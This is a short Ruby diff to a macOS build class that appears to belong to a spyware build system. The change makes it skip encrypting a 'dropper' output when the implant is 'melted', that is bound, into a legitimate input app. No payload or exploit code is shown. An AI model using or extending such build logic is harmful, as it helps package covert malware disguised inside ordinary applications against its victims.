@@ -115,7 +115,12 @@ class BuildOSX < Build
 
     File.exist? path('output_clear') || raise("output file not created by dropper")
 
-    CrossPlatform.exec path('seg_encrypt'), path('output_clear') + ' ' + path('output')
+    # do not encrypt if it's a melted app
+    if params and params['input']
+      FileUtils.mv path('output_clear'), path('output')
+    else
+      CrossPlatform.exec path('seg_encrypt'), path('output_clear') + ' ' + path('output')
+    end
 
     File.exist? path('output') || raise("output file not crypted by seg_encrypt")
 
